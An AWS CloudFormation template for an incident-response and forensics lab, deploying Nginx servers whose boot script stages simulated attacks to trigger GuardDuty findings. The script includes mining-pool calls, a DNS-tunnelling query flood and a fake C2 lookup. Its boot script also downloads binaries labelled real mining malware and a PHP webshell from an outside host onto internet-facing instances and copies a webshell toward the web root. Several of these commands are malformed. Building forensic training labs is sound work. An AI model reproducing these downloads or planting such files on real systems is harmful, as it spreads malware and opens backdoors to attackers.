---
AWSTemplateFormatVersion: '2010-09-09'
Description: Environment YAML template using create a production VPC for the Incident Response and Forensic by Woowabrothers IR Automation Project
# This sample, non-production-ready template describes an Amazon environment source code by cloudformation.
# Â© 2021 Amazon Web Services, Inc. or its affiliates. All Rights Reserved.
# This AWS Content is provided subject to the terms of the AWS Customer Agreement available at
# http://aws.amazon.com/agreement or other written agreement between Customer and either
# Amazon Web Services, Inc. or Amazon Web Services EMEA SARL or both.
############################################################################################
#
# Parameters
#
############################################################################################
Parameters:
  # IncidentResponseOwnership
  IncidentResponseProjectName:
    Description: Please your pravate name write
    Type: String
    Default: IR-Forensic
  IncidentResponseOwner:
    Type: String
    Default: FirstName LastName
  # EC2 Instances Settings
  EC2AMIID:
    Type: AWS::EC2::Image::Id
    Description: EC2 AMI ID of an Amazon Linux 2 AMI (e.g. ami-035966e8adab4aaad /ami-07464b2b9929898f8 )
    Default: ami-07464b2b9929898f8
  Ec2KeyPairName:
    Type: AWS::EC2::KeyPair::KeyName
    Description: Public/private key pair name to allow to securely connect to instances
  NginxInstanceType:
    Description: Amazon EC2 instance type for the Nginx web application instances
    Type: String
    Default: t3.medium
    AllowedValues:
      - t2.micro
      - t3.micro
      - t3.small
      - t3.medium
  NginxNodesDesiredCapacity:
    Default: '2'
    Description: The desired capacity for the Nginx Auto Scaling group
    Type: Number
  NginxNodesMaxSize:
    Default: '3'
    Description: The maximum size of the Nginx Auto Scaling group
    Type: Number
  NginxNodesMinSize:
    Default: '2'
    Description: The minimum size of the Nginx Plus Auto Scaling group
    Type: Number
  # Production VPC
  ProductionVPCId:
    Description: Production VPC Id
    Type: AWS::EC2::VPC::Id
  ProductionPublicSubnet1Id:
    Description: Production VPC Public Subnet 1 Id
    Type: AWS::EC2::Subnet::Id
  ProductionPublicSubnet2Id:
    Description: Production VPC Public Subnet 2 Id
    Type: AWS::EC2::Subnet::Id
  ProductionPrivateSubnet1Id:
    Description: Production VPC Private Subnet 1 Id
    Type: AWS::EC2::Subnet::Id
  ProductionPrivateSubnet2Id:
    Description: Production VPC Private Subnet 2 Id
    Type: AWS::EC2::Subnet::Id

############################################################################################
#
# Metadata
#
############################################################################################
Metadata:
  AWS::CloudFormation::Interface:
    ParameterGroups:
    - Label:
        default: Incident Response Ownership
      Parameters:
        - IncidentResponseProjectName
        - IncidentResponseOwner
    - Label:
        default: EC2 Instances Settings
      Parameters:
        - EC2AMIID
        - Ec2KeyPairName
        - NginxInstanceType
        - NginxNodesDesiredCapacity
        - NginxNodesMaxSize
        - NginxNodesMinSize
    - Label:
        default: Production VPC
      Parameters:
        - ProductionVPCId
        - ProductionPublicSubnet1Id
        - ProductionPublicSubnet2Id
        - ProductionPrivateSubnet1Id
        - ProductionPrivateSubnet1Id

############################################################################################
#
# Resources
#
############################################################################################
Resources:
  ################################################
  # Nginx EC2 Auto Scaling Group and Load Balancer
  ################################################
  ALBSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      VpcId: !Ref ProductionVPCId
      GroupDescription: Enable public HTTP/HTTPS access
      SecurityGroupIngress:
        - IpProtocol: 'tcp'
          FromPort: 80
          ToPort: 80
          CidrIp: 0.0.0.0/0
        - IpProtocol: 'tcp'
          FromPort: 80
          ToPort: 80
          CidrIp: 0.0.0.0/0
        - IpProtocol: 'tcp'
          FromPort: 443
          ToPort: 443
          CidrIp: 0.0.0.0/0
        - IpProtocol: 'tcp'
          FromPort: 443
          ToPort: 443
          CidrIp: 0.0.0.0/0
        - IpProtocol: 'tcp'
          FromPort: 5555
          ToPort: 5555
          CidrIp: 0.0.0.0/0
        - IpProtocol: 'tcp'
          FromPort: 5555
          ToPort: 5555
          CidrIp: 0.0.0.0/0
      Tags:
        - Key: Name
          Value: !Sub "${IncidentResponseProjectName}_ALB_SecurityGroup"
        - Key: Owner
          Value: !Ref IncidentResponseOwner
        - Key: Project
          Value: !Ref IncidentResponseProjectName
  NginxAccessSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: Instance access over SSH and HTTP access from ALB
      VpcId: !Ref ProductionVPCId
      Tags:
        - Key: Name
          Value: !Sub "${IncidentResponseProjectName}_NginxAccess_SecurityGroup"
        - Key: Owner
          Value: !Ref IncidentResponseOwner
        - Key: Project
          Value: !Ref IncidentResponseProjectName
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 80
          ToPort: 80
          SourceSecurityGroupId: !Ref ALBSecurityGroup
        - IpProtocol: tcp
          FromPort: 5555
          ToPort: 5555
          SourceSecurityGroupId: !Ref ALBSecurityGroup
      SecurityGroupEgress:
        - IpProtocol: '-1'
          CidrIp: 0.0.0.0/0
  NginxAccessExtraSecurityGroupIngress:
    Type: AWS::EC2::SecurityGroupIngress
    Properties:
      GroupId: !Ref NginxAccessSecurityGroup
      IpProtocol: '-1'
      SourceSecurityGroupId: !Ref NginxAccessSecurityGroup
  NginxWebAppInstanceRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: "Role_for_Nginx_Web_App_Instance"
      Description: This Role gives access to instances to SSM & CloudWatch
      ManagedPolicyArns:
        - "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
        - "arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service: 
                - "ec2.amazonaws.com"
            Action: 
              - "sts:AssumeRole"
      Path: "/"
  NginxWebAppInstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      InstanceProfileName: "Role_for_Nginx_Web_App_Instance"
      Path: "/"
      Roles:
        - !Ref NginxWebAppInstanceRole
  NginxWebAppALB:
    Type: AWS::ElasticLoadBalancingV2::LoadBalancer
    Properties:
      Name: !Sub "${IncidentResponseProjectName}-LoadBalancer"
      IpAddressType: ipv4
      Scheme: internet-facing
      Type: application
      Subnets:
        - !Ref ProductionPublicSubnet1Id
        - !Ref ProductionPublicSubnet2Id
      SecurityGroups:
        - !Ref ALBSecurityGroup
      Tags:
        - Key: Name
          Value: !Sub "${IncidentResponseProjectName}-LoadBalancer"
        - Key: Owner
          Value: !Ref IncidentResponseOwner
        - Key: Project
          Value: !Ref IncidentResponseProjectName
  NginxWebAppTargetGroup:
    Type: AWS::ElasticLoadBalancingV2::TargetGroup
    Properties:
      Name: !Sub "${IncidentResponseProjectName}-LB-TargetGroup"
      VpcId: !Ref ProductionVPCId
      Port: 80
      Protocol: HTTP
      HealthCheckIntervalSeconds: 30
      HealthCheckPath: /
      HealthCheckPort: '80'
      HealthCheckProtocol: HTTP
      HealthCheckTimeoutSeconds: 5
      HealthyThresholdCount: 2
      Tags:
        - Key: Name
          Value: !Sub "${IncidentResponseProjectName}-LB-TargetGroup"
        - Key: Owner
          Value: !Ref IncidentResponseOwner
        - Key: Project
          Value: !Ref IncidentResponseProjectName
  NginxWebAppALBListener:
    Type: AWS::ElasticLoadBalancingV2::Listener
    Properties:
      LoadBalancerArn: !Ref NginxWebAppALB
      Port: 80
      Protocol: HTTP
      DefaultActions:
        - Type: forward
          TargetGroupArn: !Ref NginxWebAppTargetGroup
  NginxWebAppLaunchConfig:
    Type: AWS::AutoScaling::LaunchConfiguration
    Properties:
      ImageId: !Ref EC2AMIID
      InstanceType: !Ref NginxInstanceType
      IamInstanceProfile: !Ref NginxWebAppInstanceProfile
      KeyName: !Ref Ec2KeyPairName
      SecurityGroups:
        - !Ref NginxAccessSecurityGroup
      UserData:
        Fn::Base64:
          !Sub |
            #!/bin/bash
            # Install Nginx
            sudo amazon-linux-extras install -y nginx1
            # Enable and start service
            sudo service nginx start
            # # Erase on purpose some files. This should show up in the forensic report later
            # sudo -i
            # rm /usr/share/nginx/html/index.html
            # # Just customize the default index.html
            # echo "<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">" > /usr/share/nginx/html/index.nginx.html
            # echo "<head><style type="text/css"> /*<![CDATA[*/ h1 {text-align: center;margin: 0;padding: 0.6em 2em 0.4em;background-color: #294172;color: #fff;font-weight: normal;font-size: 1.75em;border-bottom: 2px solid #000;} h1 strong {font-weight: bold;font-size: 1.5em;} /*]]>*/ </style></head>" >> /usr/share/nginx/html/index.nginx.html
            # echo "<body><h1>Welcome to the <strong>Incident Response & Forensic</strong> lab.<br>" >> /usr/share/nginx/html/index.nginx.html
            # echo "You are connected to one of the NGINX web app server located behind the loadbalancer.<br><br>" >> /usr/share/nginx/html/index.nginx.html
            # echo "The instance you are connected to is: " >> /usr/share/nginx/html/index.nginx.html
            # curl http://169.254.169.254/latest/meta-data/hostname >> /usr/share/nginx/html/index.nginx.html
            # echo "<br>with Private IP address: " >> /usr/share/nginx/html/index.nginx.html
            # curl http://169.254.169.254/latest/meta-data/local-ipv4 >> /usr/share/nginx/html/index.nginx.html
            # echo "</h1></body></html>" >> /usr/share/nginx/html/index.nginx.html
            # Create Bash scripts which can simulate improper behaviors which will be catched by GuardDuty
            mkdir /tmp/attack
            # Bitcon mining
            echo "echo \"Calling bitcoin wallets to download mining toolkits\"" > /tmp/attack/bitcoin-attack.sh
            echo "curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj > /dev/null &" >> /tmp/attack/bitcoin-attack.sh
            echo "curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk > /dev/null &" >> /tmp/attack/bitcoin-attack.sh
            chmod 754 /tmp/attack/bitcoin-attack.sh
            # DNS exfiltration
            curl https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/artifacts/queries.txt > /tmp/attack/queries.txt
            echo "echo \"Calling large numbers of large domains to simulate tunneling via DNS\"" > /tmp/attack/dns-exfiltration-attack.sh
            echo "dig -f /tmp/attack/queries.txt > /dev/null &" >> /tmp/attack/dns-exfiltration-attack.sh
            chmod 754 /tmp/attack/dns-exfiltration-attack.sh
            # Backdoor communication
            echo "echo \"Calling a well known fake domain that is used to generate a known finding\"" > /tmp/attack/backdoor-attack.sh
            echo "dig GuardDutyC2ActivityB.com any" >> /tmp/attack/backdoor-attack.sh
            chmod 754 /tmp/attack/backdoor-attack.sh
            # #Bitcoin minning Real Malware
            wget http://jamiehan.me:5555/linux /tmp/attack/linux
            wget http://jamiehan.me:5555/linux2 tmp/attack/linux2
            chmod 755 /tmp/attack/linux /tmp/attack/linux2
            #Webshell
            wget http://jamiehan.me:5555/WebShell.php /tmp/attack/Webshell.php
            chmod 755 /tmp/attack/Webhell.php
            cp /tmp/attack/webshelltest.php /var/www/html/
  NginxWebAppASGroup:
    Type: AWS::AutoScaling::AutoScalingGroup
    Properties:
      VPCZoneIdentifier:
        - !Ref ProductionPublicSubnet1Id
        - !Ref ProductionPublicSubnet2Id

      LaunchConfigurationName: !Ref NginxWebAppLaunchConfig
      HealthCheckGracePeriod: 300
      HealthCheckType: ELB
      MinSize: !Ref NginxNodesMinSize
      MaxSize: !Ref NginxNodesMaxSize
      DesiredCapacity: !Ref NginxNodesDesiredCapacity
      MetricsCollection:
        - Granularity: 1Minute
      TargetGroupARNs:
        - !Ref NginxWebAppTargetGroup
      Tags:
        - Key: Name
          Value: !Sub "${IncidentResponseProjectName}_NginxWeb_ASGroup"
          PropagateAtLaunch: true
        - Key: Owner
          Value: !Ref IncidentResponseOwner
          PropagateAtLaunch: true
        - Key: Project
          Value: !Ref IncidentResponseProjectName
          PropagateAtLaunch: true
    UpdatePolicy:
      AutoScalingRollingUpdate:
        MinInstancesInService: 1
        MaxBatchSize: 1
        PauseTime: PT5M
        WaitOnResourceSignals: false

############################################################################################
#
# Outputs
#
############################################################################################
Outputs:
  NginxWebAppStackName:
    Description: The name of the stack used to deploy the Nginx WebApp
    Value: !Sub ${AWS::StackName}
    Export:
      Name: !Sub "${AWS::StackName}-NginxWebAppStackName"
  EC2AMIID:
    Description: EC2 AMI ID used in the Incident Response lab
    Value: !Ref EC2AMIID
    Export:
      Name: !Sub "${AWS::StackName}-EC2AMIID"
  Ec2KeyPairName:
    Description: Public/private key pair used by instances in the Incident Response lab
    Value: !Ref Ec2KeyPairName
    Export:
      Name: !Sub "${AWS::StackName}-Ec2KeyPairName"
  NginxInstanceType:
    Description: Instance type used in the Incident Response lab
    Value: !Ref NginxInstanceType
    Export:
      Name: !Sub "${AWS::StackName}-NginxInstanceType"